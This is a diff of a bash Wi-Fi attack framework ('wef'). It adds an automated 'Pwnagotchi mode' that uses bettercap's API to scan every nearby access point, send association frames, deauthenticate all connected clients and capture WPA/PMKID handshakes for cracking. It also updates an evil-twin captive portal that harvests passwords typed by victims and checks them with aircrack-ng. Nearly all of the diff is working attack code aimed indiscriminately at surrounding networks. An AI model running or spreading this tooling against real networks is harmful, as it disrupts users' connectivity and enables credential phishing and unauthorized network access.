   if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
-    crack_pmkid_handshakes "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt"
+    crack_pmkid_handshakes "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt"
   elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
     ctrl_c
   else
@@ -3321,16 +3442,16 @@ function pmkid_attack(){
 
 # Inhibitor Function
 function inhibitor(){
-  trap inhibition_c INT # Change Ctrl + C keyboard interrupt function
+  trap inhibition_c INT # Change Ctrl+C keyboard interrupt function
 
   iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
 
   if [ "$lang" == "en" ]; then
     progress_bar 2 0.2 "*" "Starting inhibition process"
-    color_output_ln "*" "Press Ctrl + C to stop the attack"
+    color_output_ln "*" "Press Ctrl+C to stop the attack"
   else
     progress_bar 2 0.2 "*" "Comenzando proceso de inhibición" 
-    color_output_ln "*" "Presiona Ctrl + C para parar el ataque"
+    color_output_ln "*" "Presiona Ctrl+C para parar el ataque"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -3426,7 +3547,7 @@ function create_lighttpd_conf(){
 	echo -e "  url.redirect-code = 302"
 	echo -e "}\n"
 	echo -e "server.port = 80\n"
-	echo -e "index-file.names = ( \"index.htm\" )\n"
+	echo -e "index-file.names = ( \"index.htm\", \"index.html\", \"index.php\" )\n"
 	echo -e "server.error-handler-404 = \"/\"\n"
 	echo -e "mimetype.assign = ("
 	echo -e "  \".css\" => \"text/css\","
@@ -3434,29 +3555,30 @@ function create_lighttpd_conf(){
   echo -e "  \".html\" => \"text/html\""
 	echo -e ")\n"
 	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
-	} >> "/opt/wef/cache/lighttpd.conf"
+	} >> "/usr/share/wef/cache/lighttpd.conf"
 }
 
 # Use 'sed' with regex to edit template
 function create_template(){
-  sed -i "s/<span class=\"bold\">.*<\/span>/<span class=\"bold\">${essid}<\/span>/" /opt/wef/main/captive-portals/${country_code}-portal/index.htm
+  sed -i "s/<span class=\"bold\">.*<\/span>/<span class=\"bold\">${essid}<\/span>/" /usr/share/wef/main/captive-portals/${country_code}-portal/index.htm
   handshake_path=$(echo "${handshake_cap}" | sed 's/\//\\\//g')
 
-  sed -i "26s/.*/timeout 1.5 bash -c \"aircrack-ng -a 2 -b ${ap_bssid} -w \"\/tmp\/www\/currentpass.txt\" \"${handshake_path}\" | grep \"KEY FOUND!\" 2>\/dev\/null\"/" /opt/wef/main/captive-portals/${country_code}-portal/check.htm
-  #sed -i "26s/.*/aircrack-ng -a 2 -b ${ap_bssid} -w \"\/tmp\/www\/currentpass.txt\" \"${handshake_path}\" | grep \"KEY FOUND!\" > \/dev\/null/" /opt/wef/main/captive-portals/${country_code}-portal/check.htm
+  sed -i "26s/.*/if [ \"\$(timeout 1.5 bash -c \"aircrack-ng -a 2 -b ${ap_bssid} -w \'\/tmp\/www\/currentpass.txt\' \'${handshake_path}\' 2>\/dev\/null | grep \'KEY FOUND\'\")\" ]; then/" /usr/share/wef/main/captive-portals/${country_code}-portal/check.htm
 }
 
 function check_eviltwin_password(){
   while true; do
+    sleep 0.1
     if [ -f "/tmp/www/success.txt" ] && [ "$(cat /tmp/www/currentpass.txt)" ]; then
       if [ "$lang" == "en" ]; then
         echo -e "\n\n${blueC}[${greenC}+${blueC}] Correct password obtained: ${yC}$(cat /tmp/www/currentpass.txt)${endC}"
-        good_output "+" "Password stored in /opt/wef/main/captures/${essid}/eviltwin_password.txt"
+        good_output "+" "Password stored in /usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt"
       else
         echo -e "\n\n${blueC}[${greenC}+${blueC}] Contraseña correcta obtenida: ${yC}$(cat /tmp/www/currentpass.txt)${endC}"
-        good_output "+" "Contraseña almacenada en /opt/wef/main/captures/${essid}/eviltwin_password.txt"
+        good_output "+" "Contraseña almacenada en /usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt"
       fi
-      cp "/tmp/www/currentpass.txt" "/opt/wef/main/captures/${essid}/eviltwin_password.txt" 2>/dev/null
+      
+      cp "/tmp/www/currentpass.txt" "/usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt" 2>/dev/null
       rm -rf "/tmp/www" 2>/dev/null
 
       sleep 4
@@ -3506,17 +3628,17 @@ function check_eviltwin_success(){
 
     if [ -f "/tmp/www/currentpass.txt" ]; then
       if [ "$lang" == "en" ]; then
-        echo -e "\n${blueC}Last passwords tried:\n${grayC}$(cat /tmp/www/attempts.txt)${endC}"
+        echo -e "\n${blueC}Last passwords tried:\n${grayC}$(cat /tmp/www/attempts.txt 2>/dev/null)${endC}"
       else
-        echo -e "\n${blueC}Últimas contraseñas probadas:\n${grayC}$(cat /tmp/www/attempts.txt)${endC}"
+        echo -e "\n${blueC}Últimas contraseñas probadas:\n${grayC}$(cat /tmp/www/attempts.txt 2>/dev/null)${endC}"
       fi
     fi
 
     if [ -f "/tmp/www/success.txt" ]; then
       if [ "$lang" == "en" ]; then
-        echo -e "\n${blueC}[${greenC}+${blueC}] Correct password: ${grayC}$(cat /tmp/www/currentpass.txt)${endC}${endC}"
+        echo -e "\n${blueC}[${greenC}+${blueC}] Correct password: ${grayC}$(cat /tmp/www/currentpass.txt 2>/dev/null)${endC}${endC}"
       else
-        echo -e "\n${blueC}[${greenC}+${blueC}] Contraseña correcta: ${grayC}$(cat /tmp/www/currentpass.txt)${endC}${endC}"
+        echo -e "\n${blueC}[${greenC}+${blueC}] Contraseña correcta: ${grayC}$(cat /tmp/www/currentpass.txt 2>/dev/null)${endC}${endC}"
       fi
       sleep 5
       break
@@ -3526,9 +3648,425 @@ function check_eviltwin_success(){
   done
 }
 
+function execute_bettercap_command(){
+  curl -s -X POST "http://user:pass@127.0.0.1:8081/api/session" -H "Content-Type: application/json" -d '{"cmd": "'"${1}"'"}' &>/dev/null
+}
+
+function pwnagotchi_check_handshake(){
+  sleep 6
+
+  #cch="$(curl -s http://user:pass@127.0.0.1:8081/api/session | jq -r '.wifi.aps' | jq -r --arg mac "${1}" 'map(select(.mac == $mac)) | .[] | if .handshake == true then "true" else "false" end')"
+
+  wpa_check="$(echo "1" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep "WPA" | grep -i "${1}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")"
+  pmkid_check="$(echo "1" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep "WPA" | grep -i "${1}" | grep "PMKID")"
+
+  if [ ! "$wpa_check" ]; then
+    wpa_check=0
+  fi
+
+  # Debug
+  #echo -e "ESSID: ${2}; BSSID: ${1}; wpa_check: ${wpa_check}; pmkid_check: ${pmkid_check}"
+
+  # Check if at least one WPA or PMKID handshake was captured
+  if [[ "${wpa_check}" -gt 0 ]] || [ "${pmkid_check}" ]; then
+    # Extract handshake from .pcap file
+    hcxpcapngtool /root/bettercap-wifi-handshakes.pcap -o /usr/share/wef/cache/bettercap_handshakes.txt &>/dev/null
+    sleep 0.1
+
+    if [ "$(cat /usr/share/wef/cache/bettercap_handshakes.txt | grep -i "$(echo "${1}" | tr -d ":")")" ]; then
+      if [ "${2}" ]; then
+        if [ "$lang" == "en" ]; then
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] ${grayC}${2} ${blueC}(${grayC}${1}${blueC}) handshake has been captured and written to /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt${endC}"
+        else
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] El handshake de ${grayC}${2} ${blueC}(${grayC}${1}${blueC}) ha sido capturado y guardado como /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt${endC}"
+        fi
+      else
+        if [ "$lang" == "en" ]; then
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] ${grayC}${1} ${blueC} handshake has been captured and written to /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt${endC}"
+        else
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] El handshake de ${grayC}${1} ${blueC} ha sido capturado y guardado como /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt${endC}"
+        fi
+      fi
+
+      # Create a folder to save captured handshakes based on each AP essid and bssid
+      if [ ! -d "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/" ] && [ "${2}" ]; then
+        mkdir "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/" 2>/dev/null
+      elif [ ! "${2}" ]; then
+        mkdir "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/" 2>/dev/null
+      fi
+
+      sleep 0.1
+
+      if [ "${2}" ]; then
+        hcxhashtool -i /usr/share/wef/cache/bettercap_handshakes.txt -o /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt --mac-ap=$(echo "${1}" | tr -d ":") &>/dev/null
+      else
+        hcxhashtool -i /usr/share/wef/cache/bettercap_handshakes.txt -o /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt --mac-ap=$(echo "${1}" | tr -d ":") &>/dev/null
+      fi
+    fi
+
+    rm /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null
+  fi
+}
+
+# Declare array which will contain the discovered APs
+export seen_aps=()
+# Declare array which will contain the APs that have been already pwned to skip them during loop
+export pwned_aps_list=()
+# Declare array which will contain APs that have not been pwned on the first attempt
+export not_pwned_aps_list=()
+# Declare array which will contain the APs that their handshake have not been captured even after multiple attempts to skip them
+export not_pwneable_aps_list=()
+
+function pwnagotchi(){
+  clear
+
+  if [ "$lang" == "en" ]; then
+    # Display info about current status
+    echo -e "${yC}PWNAGOTCHI MODE${endC}"
+    echo -e "${yC}---------------${endC}"
+
+    color_output "*" "The Pwnagotchi mode runs indefinitely until you press Ctrl+C"
+    color_output "*" "If you want to add an AP to the whitelist, edit the config file and add \"whitelist=<your bssid goes here>\" without the double quotes"
+    color_output "*" "Obtained handshakes will be stored in /usr/share/wef/main/pwnagotchi/"
+    color_output "*" "A new folder will be created for every targeted AP to store the obtained info"
+  else
+    # Display info about current status
+    echo -e "${yC}MODO PWNAGOTCHI${endC}"
+    echo -e "${yC}---------------${endC}"
+
+    color_output "*" "El modo Pwnagotchi correrá de forma infinita hasta que presiones Ctrl+C"
+    color_output "*" "Si quieres añadir un AP a la whitelist, edita el archivo de configuración y añade \"whitelist=<tu bssid va aquí>\" sin las comillas"
+    color_output "*" "Los handshakes obtenidos se almacenarán en /usr/share/wef/main/pwnagotchi/"
+    color_output "*" "Se creará una carpeta por cada AP que sea atacado para almacenar la información obtenida"
+  fi
+
+  press_enter_attack
+
+  trap keep_exit_pwnagotchi INT
+  
+  # Create directory for current pwnagotchi session
+  pwnagotchi_dir="$(date +"%Y-%m-%d-%H-%M-%S")"
+  mkdir "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/" 2>/dev/null
+
+  if [ "" == "en" ]; then
+    color_output_ln "*" "Starting bettercap service..."
+    color_output "*" "Gathered information will be saved under /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/"
+  else
+    color_output_ln "*" "Iniciando servicio de bettercap..."
+    color_output "*" "La información obtenida se almacenará bajo la ruta /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/"
+  fi
+  bettercap -caplet http-ui -iface "${netCard}" &>/dev/null &
+  sleep 2
+  echo
+
+  # Declare variable just to check on first loop
+  first_loop="true"
+
+  # Declare time to reset detected APs
+  reset_time="60s"
+
+  # Declare debug variable (just for development purposes)
+  debug="false"
+
+  whitelist_bssid="$(awk -F '=' '/whitelist/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " " | tr '[:upper:]' '[:lower:]' )"
+
+  # Display info about current status
+  if [ "$lang" == "en" ]; then
+    echo -e "${yC}ACTIVITY LOG${endC}"
+    echo -e "${yC}------------${endC}"
+  else
+    echo -e "${yC}REGISTRO DE ACTIVIDAD${endC}"
+    echo -e "${yC}---------------------${endC}"
+  fi
+
+  # Scan nearby APs
+  execute_bettercap_command "wifi.recon on"
+  sleep 0.5
+
+  #(
+    #while true; do
+      # Wait for N time to reset available information about current nearby APs that have not been pwned yet 
+      #sleep "${reset_time}"
+
+      #echo -e "RESETTING ARRAYS"
+
+      # Empty arrays
+      #seen_aps=()
+      #not_pwned_aps=()
+      #not_pwneable_aps=()
+    #done
+  #) &
+
+  # Start infinite loop
+  while true; do
+    # Scan nearby APs (wifi.recon on)
+    # Sleep for 6 seconds
+    # Iterate over all APs
+    # Change current channel (wifi.recon.channel x) in case it is different
+    # Send association to get PMKID (wifi.assoc <bssid>)
+    # Deauth all clients (one by one) (wifi.deauth <station>)
+
+    # Set channels on which to scan nearby APs
+    execute_bettercap_command "wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12,13"
+
+    if [ "$lang" == "en" ]; then
+      if [ "${first_loop}" == "true" ]; then
+        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Scanning nearby access points${endC}"
+      else
+        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Scanning new nearby access points${endC}"
+      fi
+    else
+      if [ "${first_loop}" == "true" ]; then
+        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Escaneando puntos de acceso cercanos${endC}"
+      else
+        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Escaneando nuevos puntos de acceso cercanos${endC}"
+      fi
+    fi
+
+    # Wait some seconds to discover nearby APs and their stations
+    sleep 6.75
+
+    # Extract and parse JSON info using jq
+    aps="$(curl -s "http://user:pass@127.0.0.1:8081/api/session" | jq -r '.wifi.aps' | jq -r 'map(select((.channel < 36 or .channel > 165) and .encryption != "OPEN")) | sort_by(.channel) | .[] | "\(.mac),\(.hostname),\(.channel)," + (if .clients | length > 0 then "" + (.clients[] | "\(.mac),") else "" end)' | sort -u)"
+
+    if [ "$debug" == "true" ]; then
+      echo -e "$aps\n"
+    fi
+
+    #echo -e "aps: $aps"
+    #echo -e "old_aps: $old_aps"
+
+    # Parse pwned APs
+    for d in /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/*; do
+      pwned_bssid="$(echo "${d}" | awk '{print $NF}' FS="/" | awk '{print $NF}' FS="-")"
+
+      if [ "${pwned_bssid}" != "*" ]; then
+        pwned_aps_list+=("${pwned_bssid}")
+      fi
+
+      # Remove AP from other arrays because it has been pwned
+      if [ "${pwned_bssid}" ] && [ "${pwned_bssid}" != "*" ]; then
+        seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
+        not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
+        not_pwneable_aps_list=($(echo "${not_pwneable_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
+      fi
+    done
+
+    # Remove duplicates
+    seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
+    pwned_aps_list=($(echo "${pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
+    not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
+    not_pwneable_aps_list=($(echo "${not_pwneable_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
+
+    activity="false"
+
+    if [ "$debug" == "true" ]; then
+      echo -e "seen_aps: ${seen_aps[@]}"
+      echo -e "pwned_aps_list: ${pwned_aps_list[@]}"
+      echo -e "not_pwned_aps_list: ${not_pwned_aps_list[@]}"
+      echo -e "not_pwneable_aps_list: ${not_pwneable_aps_list[@]}\n"
+    fi
+
+    # Iterate over all APs discovered
+    while IFS= read -r line; do
+      already_pwned="false"
+      not_pwned="false"
+      not_pwneable="false"
+      removed_from_seen_aps="false"
+
+      if [ "$exit_from_tool" == "false" ]; then
+        if [ "$lang" == "en" ]; then
+          color_output_ln  "*" "Returning to main menu..."
+        else
+          color_output_ln "*" "Volviendo al menú principal..."
+        fi
+        sleep 1
+
+        break
+      elif [ "$exit_from_tool" == "true" ]; then
+        break
+      fi
+
+      # Parse information
+      bssid="$(echo ${line} | awk '{print $1}' FS=',' | sed 's/^[" "]*//')"
+      essid="$(echo ${line} | grep -oP "(?<=$bssid,).*(?=,\d+,)")"
+      channel="$(echo ${line} | grep -oP "(?<=$bssid,$essid,)(\d+)(?=,)")"
+      stations_info="$(echo -e "${aps}" | grep -i "${bssid}" | awk '{print $2}' FS="${bssid},${essid},${channel}," | tr -d "\n")"
+      IFS=',' read -r -a stations <<< "$stations_info"
+
+      #echo -e "bssid: $bssid"
+      #echo -e "essid: $essid"
+      #echo -e "channel: $channel"
+      #echo -e "stations_info: $stations_info"
+      #echo -e "stations: ${stations[@]}"
+
+      if [ "${whitelist_bssid}" == "$(echo "${bssid}" | tr '[:upper:]' '[:lower:]')" ]; then
+        if [ "$debug" == "true" ]; then
+          echo -e "Skipping whitelist bssid"
+        fi
+        continue
+      fi
+
+      # Check if current AP was already pwned to skip it
+      for pwned_ap in "${pwned_aps_list[@]}"; do
+        if [ "${pwned_ap}" == "${bssid}" ]; then
+          already_pwned="true"
+          break
+        fi
+      done
+
+      # Skip until next AP
+      if [ "$already_pwned" == "true" ]; then
+        if [ "$debug" == "true" ]; then
+          echo -e "Skipping ${bssid} ($essid) as it is already pwned"
+        fi
+        continue
+      fi
+
+      pwnagotchi_check_handshake "${bssid}" "${essid}" &
+
+      # Check if AP is included in not_pwned_aps_list array
+      for not_pwned_ap in "${not_pwned_aps_list[@]}"; do
+        if [ "${not_pwned_ap}" == "${bssid}" ]; then
+          #echo "Removing $bssid ($essid) from not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
+          not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
+          #echo "Adding $bssid ($essid) to not_pwneable_aps_list: $(echo ${not_pwneable_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
+          not_pwneable_aps_list+=("${bssid}")
+          not_pwned="true"
+          break
+        fi
+      done
+
+      # Parse stations associated to each AP and check if new stations were added
+      current_stations="${stations_info}"
+      old_stations="$(echo "${old_aps}" | grep -i "${bssid}" | awk '{print $2}' FS="${bssid},${essid},${channel}," | tr -d "\n")"
+
+      if [ "$debug" == "true" ]; then
+        echo "current_stations: ${current_stations[@]}"
+        echo "old_stations: ${old_stations[@]}"
+      fi
+
+      #echo -e "current_stations: ${current_stations[@]}"
+      #echo -e "old_stations: ${old_stations[@]}"
+
+      # Check if current AP is marked as a AP which cannot be pwned due to multiple unsuccessful attempts
+      for not_pwneable_ap in ${not_pwneable_aps_list[@]}; do
+        if [ "${not_pwneable_ap}" == "${bssid}" ] && [ "${current_stations}" == "${old_stations}" ]; then
+          not_pwneable="true"
+          break
+        fi
+      done
+
+      # Skip until next AP as current AP is not pwneable
+      if [ "${not_pwneable}" == "true" ]; then
+        #echo -e "Skipping not pwneable AP: ${bssid}"
+        seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
+        not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
+        continue
+      fi
+
+      # Iterate over seen_aps array to add current AP to not_pwned_aps in case its handshake was not captured
+      for seen_ap in "${seen_aps[@]}"; do
+        if [ "${seen_ap}" == "${bssid}" ]; then
+          #echo "Adding $bssid ($essid) to not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
+          not_pwned_aps_list+=("${bssid}") # Add AP to not_pwned_aps_list array
+          #echo "Removing $bssid ($essid) from seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
+          seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
+          removed_from_seen_aps="true"
+          break
+        fi
+      done
+
+      # If current AP is not present in not_pwned_aps_list array, then add it to seen_aps array as it is a new discovered AP
+      if [ "${removed_from_seen_aps}" == "false" ] && [ "${not_pwned}" == "false" ] && [ "${not_pwneable}" == "false" ]; then
+        #echo "Adding $bssid (${essid}) to seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
+        # Add bssid to seen_aps arraya
+        seen_aps+=("${bssid}")
+        #echo -e "$bssid (${essid}) added to seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
+      fi
+
+      # Change current channel to interact with target if necessary
+      if [ "${current_channel}" != "${channel}" ] || [ "$first_loop" == "true" ]; then
+        execute_bettercap_command "wifi.recon.channel ${channel}"
+        current_channel="${channel}"
+        first_loop="false"
+        sleep 0.1
+      fi
+
+      # Send association to AP to try to catch PMKID handshake
+      execute_bettercap_command "wifi.assoc ${bssid}"
+      activity="true"
+
+      if [ "$essid" ]; then
+        if [ "$lang" == "en" ]; then
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Sending association frame to ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
+        else
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Enviando paquete de asociación a ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
+        fi
+      else
+        if [ "$lang" == "en" ]; then
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Sending association frame to ${grayC}${bssid}${endC}"
+        else
+          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Enviando paquete de asociación a ${grayC}${bssid}${endC}"
+        fi
+      fi
+
+      sleep 0.2
+
+      # Deauthenticate stations of current AP
+      for sta in ${stations}; do
+        if [ "$essid" ]; then
+          if [ "$lang" == "en" ]; then
+            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deauthing station ${grayC}${sta} ${blueC}from ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
+          else
+            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deautenticando la estación ${grayC}${sta} ${blueC}de ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
+          fi
+        else
+          if [ "$lang" == "en" ]; then
+            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deauthing station ${grayC}${sta} ${blueC}from ${grayC}${bssid}${endC}"
+          else
+            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deautenticando la estación ${grayC}${sta} ${blueC}de ${grayC}${bssid}${endC}"
+          fi
+        fi
+        execute_bettercap_command "wifi.deauth ${sta}"
+
+        activity="true"
+        sleep 0.2
+      done
+
+      sleep 0.1
+      #pwnagotchi_check_handshake "${bssid}" "${essid}" &
+
+    done < <(printf '%s\n' "${aps}")
+
+    if [ "${activity}" == "false" ]; then
+      if [ "$lang" == "en" ]; then
+        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] There is not recent activity (no new APs were discovered)${endC}"
+      else
+        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] No hay actividad reciente (no se encontraron nuevos APs)${endC}"
+      fi
+    fi
+
+    if [ "$exit_from_tool" == "true" ]; then
+      killall bettercap &>/dev/null
+      rm /root/bettercap-wifi-handshakes.pcap /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null
+      ctrl_c
+    elif [ "$exit_from_tool" == "false" ]; then
+      killall bettercap &>/dev/null
+      rm /root/bettercap-wifi-handshakes.pcap /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null
+      exit_from_tool=""
+      break
+    fi
+
+    old_aps="${aps}"
+
+  done
+}
+
 # Evil Twin: 1º Hostapd --> 2º Dnsmasq --> 3º Lighttpd --> 4º Deauth (optional)
 function evil_twin(){
   clear
+  color_output_ln "*" "This attack creates a fake access point to obtain the password of a legitimate access point or login credentials by using custom templates"
   scan_aps
   log_back_to_menu
 
@@ -3545,17 +4083,30 @@ function evil_twin(){
   fi
 
   if [ "$lang" == "en" ]; then
-    echo -e "${blueC}\nType of attack:${endC}"
+    echo -e "${blueC}\nAvailable types of attack:${endC}"
   else
-    echo -e "${blueC}\nTipo de ataque:${endC}"
+    echo -e "${blueC}\nTipos de ataques disponibles:${endC}"
   fi
   evil_twin_panel
-  echo
-  if [ "$lang" == "en" ]; then
-    color_output_no_line "*" "Select an option: " && read evil_option
-  else
-    color_output_no_line "*" "Selecciona una opción: " && read evil_option
-  fi
+
+  while true; do
+    echo
+    if [ "$lang" == "en" ]; then
+      color_output_no_line "*" "Select an option: " && read evil_option
+    else
+      color_output_no_line "*" "Selecciona una opción: " && read evil_option
+    fi
+
+    if [ "$evil_option" != "1" ] && [ "$evil_option" != "2" ] && [ "$evil_option" != "3" ] && [ "$evil_option" != "4" ]; then
+      if [ "$lang" == "en" ]; then
+        color_output "X" "Invalid option"
+      else
+        color_output "X" "Opción inválida"
+      fi
+    else
+      break
+    fi
+  done
 
   if [ "$evil_option" == "back" ]; then
     return
@@ -3565,56 +4116,101 @@ function evil_twin(){
   if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
 
     if [ "$lang" == "en" ]; then
-      color_output_no_line "*" "Do you want to verify if submitted passwords are correct? [${yC}y${blueC}/${yC}n${blueC}]: " && read check_passwords
+      color_output_no_line "*" "Do you want to use built-in templates (${yC}1${blueC}) or custom ones (${yC}2${blueC})? (default=1): " && read template_type
     else
-      color_output_no_line "*" "¿Quieres verificar si las contraseñas introducidas son correctas? [${yC}s${blueC}/${yC}n${blueC}]: " && read check_passwords
+      color_output_no_line "*" "¿Quieres usar plantillas predefinidas (${yC}1${blueC}) o plantillas personalizadas (${yC}2${blueC})? (por defecto=1): " && read template_type
     fi
 
-    if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ]; then
+    if [ "$template_type" == "1" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
       if [ "$lang" == "en" ]; then
-        color_output_no_line "*" "A handshake containing target AP handshake is needed to check if provided password is correct, do you want to continue [${yC}y${blueC}/${yC}n${blueC}]: " && read h_continue
+        color_output_no_line "*" "Do you want to verify if submitted passwords are correct? (target's handshake needed) (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read check_passwords
       else
-        color_output_no_line "*" "Se necesita un archivo con el handshake del AP objetivo para comprobar si la contraseña es correcta, ¿quieres continuar [${yC}s${blueC}/${yC}n${blueC}]: " && read h_continue
+        color_output_no_line "*" "¿Quieres verificar si las contraseñas introducidas son correctas? (se necesita el handshake del AP) (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read check_passwords
       fi
 
-      if [ "$h_continue" != "y" ] && [ "$h_continue" != "yes" ] && [ "$h_continue" != "s" ] && [ "$h_continue" != "si" ]; then
-        return
-      fi
+      if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ] || [ ! "$check_passwords" ]; then
+        while true; do
+          if [ "$lang" == "en" ]; then
+            color_output_no_line "*" "Introduce path to handshake file: " && read handshake_cap
+          else
+            color_output_no_line "*" "Introduce la ruta del archivo de handshake: " && read handshake_cap
+          fi
 
-      while true; do
-        if [ "$lang" == "en" ]; then
-          color_output_no_line "*" "Introduce path to handshake file: " && read handshake_cap
-        else
-          color_output_no_line "*" "Introduce la ruta del archivo de handshake: " && read handshake_cap
-        fi
+          cap_name="${handshake_cap}"
+          if [ "${handshake_cap}" == "back" ]; then
+            return
+          elif [ -f "${handshake_cap}" ]; then
 
-        cap_name="${handshake_cap}"
-        if [ "${handshake_cap}" == "back" ]; then
-          return
-        elif [ -f "${handshake_cap}" ]; then
-          if [ "$(check_handshakes_in_file)" -gt "0" ]; then
-            break
+            if [ ! "$(file "${handshake_cap}" | grep "cap capture file")" ]; then
+              if [ "$lang" == "en" ]; then
+                color_output "X" "Given file is not a valid network capture"
+              else
+                color_output "X" "El archivo no es una captura de red válida"
+              fi
+
+              continue
+            fi
+
+            if [ "$(check_handshakes_in_file "${cap_name}")" -gt "0" ]; then
+              break
+            else
+              if [ "$lang" == "en" ]; then
+                color_output "X" "File does not contain any handshake"
+              else
+                color_output "X" "El archivo no contiene ningún handshake"
+              fi
+            fi
           else
             if [ "$lang" == "en" ]; then
-              color_output "X" "File does not contain any handshake"
+              color_output "X" "File does not exist"
             else
-              color_output "X" "El archivo no contiene ningún handshake"
+              color_output "X" "El archivo no existe"
             fi
           fi
+        done
+      elif [ "$check_passwords" == "back" ]; then
+        return
+      fi
+    elif [ "$template_type" == "2" ] || [ "$template_type" == "custom" ]; then
+      while true; do
+        if [ "$lang" == "en" ]; then
+          color_output_no_line "*" "Introduce path to template root: " && read portal_path
         else
+          color_output_no_line "*" "Introduce la ruta de la raíz de la plantilla: " && read portal_path
+        fi
+
+        if [ ! -d "${portal_path}" ]; then
           if [ "$lang" == "en" ]; then
-            color_output "X" "File does not exist"
